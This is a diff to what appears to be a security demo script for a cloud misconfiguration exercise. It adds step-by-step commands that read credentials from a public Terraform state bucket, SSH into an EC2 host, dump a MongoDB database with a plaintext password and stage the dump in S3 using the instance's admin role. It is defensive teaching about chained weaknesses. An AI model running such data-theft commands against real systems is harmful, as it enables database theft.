@@ -329,12 +329,12 @@ To get a complete picture of this environment, I checked six different tools: Ch
 
 "Let me show you something concrete."
 
-*(Open browser — navigate to the S3 bucket directly, no login)*
+*(Open browser — navigate to the Terraform state bucket, no login required)*
 ```
-https://movie-buddy-db-backups.s3.amazonaws.com/
+https://movie-buddy-tfstate-329153220664.s3.amazonaws.com/
 ```
 
-"This bucket is publicly readable — no credentials required. That's a Checkov finding. Now watch what's inside."
+"This is the bucket that holds the Terraform state file. It's publicly readable — no credentials required, no AWS account needed. Just a browser. Watch what's inside."
 
 *(Run in terminal)*
 ```bash
@@ -342,11 +342,35 @@ aws s3 cp s3://movie-buddy-tfstate-329153220664/wiz-exercise/terraform.tfstate -
   | python3 -m json.tool | grep -A3 mongodb_url
 ```
 
-"The Terraform state file contains the MongoDB connection string — username and password — in plain text. And it's sitting in a publicly accessible bucket. Now watch how far this goes."
+"The Terraform state file contains the MongoDB connection string — username and password — in plain text. Now watch how far this goes."
 
-*(SSH into EC2, run mongodump, then aws s3 cp to exfiltrate)*
+*(Run in terminal — SSH into EC2)*
+```bash
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237
+```
 
-"I just dumped the entire customer database to S3 — using the EC2's own IAM role to do it. No AWS credentials. No special tools. This chains three separate weaknesses: public S3 exposes the credentials. Open SSH on port 22 lets an attacker reach the server. And the AdministratorAccess IAM role means once they're on the machine, they own the entire AWS account — they don't even need their own credentials to exfiltrate data.
+"Port 22 is open to the entire internet. I'm in. Now I dump the entire database — and to exfiltrate it, I don't need my own AWS credentials. The EC2 has AdministratorAccess attached. I just use the machine's own identity."
+
+*(Run inside EC2 shell)*
+```bash
+mongodump --host localhost --port 27017 \
+  -u admin -p 'MovieBuddy2024!' --authenticationDatabase admin \
+  --db movie_buddy --out /tmp/exfil
+
+tar -czf /tmp/movie_buddy_dump.tar.gz -C /tmp exfil
+
+aws s3 cp /tmp/movie_buddy_dump.tar.gz \
+  s3://movie-buddy-tfstate-329153220664/exfil/movie_buddy_dump.tar.gz
+```
+
+*(Back in local terminal — confirm the dump landed)*
+```bash
+aws s3 ls s3://movie-buddy-tfstate-329153220664/exfil/
+```
+
+"The entire customer database is now staged in S3 — using your own cloud account to do it. An attacker with a browser, an SSH client, and the AWS CLI just did this. No credentials of their own at any step.
+
+This chains three separate weaknesses: public S3 exposes the credentials. Open SSH on port 22 provides server access. And the AdministratorAccess IAM role means once they're on the machine, they own the entire AWS account — they don't even need their own credentials to exfiltrate data.
 
 Checkov flagged the public bucket as one finding. It flagged the IAM role as another. Inspector flagged the open SSH port. But no tool connected these three dots and said: together, these create a complete path from the public internet to a full database dump — using your own cloud infrastructure to stage the stolen data.
 
